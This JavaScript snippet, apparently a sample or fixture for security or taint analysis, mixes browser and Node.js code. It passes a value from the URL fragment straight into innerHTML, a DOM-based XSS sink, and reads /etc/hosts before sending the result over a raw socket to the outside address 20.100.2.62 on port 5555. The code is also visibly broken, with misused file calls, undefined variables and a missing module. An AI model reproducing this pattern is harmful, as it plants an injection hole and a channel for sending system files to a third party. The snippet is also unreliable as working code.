var param = document.location.hash.split("#")[1];
var test = document.location.hash.split("#")[2];

var HOST = '20.100.2.62';
var PORT = '5555';

var socket = new net.Socket();

fs = require('fs')
var test2 = fs.read('/etc/hosts', 'utf8', function (err,data) {
	  if (err) {
		      return console.log(err);
		    }
	  console.log(data);

	var d = document.createElement('div');
	d.innerHTML = test;
});

socket.connect (PORT, HOST, function() {
	        console.log('CONNECTED TO: ' + HOST + ':' + PORT)
	        socket.write(test2)
})


fs.readSync(fd,r,0,1,0);

var request = require("request");

https.request("http://www.sitepoint.com", function(error, response, body) {
	  console.log(body);

	        var d = document.createElement('div');
	        d.innerHTML = test;

});

